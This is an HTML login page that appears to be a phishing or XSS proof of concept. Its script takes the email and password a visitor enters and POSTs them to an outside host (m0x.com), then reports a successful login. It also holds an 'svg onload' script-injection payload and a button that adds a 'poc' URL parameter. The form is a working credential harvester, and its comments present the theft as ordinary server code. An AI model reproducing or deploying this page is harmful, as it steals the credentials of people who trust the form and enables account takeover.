<!DOCTYPE html>
<html>
<head>
    <title>Login Page</title>
</head>
<body>
    <h1>Login</h1>
    <form id="loginForm" method="post">
        <label for="email">Email:</label>
        <input type="email" id="email" name="email" required><br><br>

        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required><br><br>

        <input type="submit" value="Login">
        <button type="button" id="addParam">Add Parameter</button>
    </form>
</body>
<script>
    const loginForm = document.getElementById('loginForm');
    const addParamButton = document.getElementById('addParam');
    
    loginForm.addEventListener('submit', function(event) {
        event.preventDefault(); // Prevent the form from submitting traditionally.

        // Get the email and password values
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        
        // Send the data to your server (https://m0x.com in this case)
        // You should replace this with your actual server URL and any required data format.
        const serverURL = 'https://m0x.com'; 
        const data = { email, password }; // You may need to format the data according to your server's requirements.
        
        // Use fetch to send the data to the server
        fetch(serverURL, {
            method: 'POST',
            body: JSON.stringify(data), // You may need to use a different data format depending on your server.
            headers: {
                'Content-Type': 'application/json', // Adjust the content type if needed.
            }
        })
        .then(response => {
            if (response.ok) {
                // Successfully sent data to the server
                alert("Login successful!");
            } else {
                // Failed to send data to the server
                alert("Login failed. Please try again.");
            }
        })
        .catch(error => {
            console.error("An error occurred:", error);
        });
    });

    addParamButton.addEventListener('click', () => {
        const currentURL = window.location.href;
        const newURL = new URL(currentURL);
        newURL.searchParams.set('a', 'poc');
        window.location.href = newURL.toString();
    });
</script>
<svg/onload=alert("pocBY_m0x_noob")>
</html>
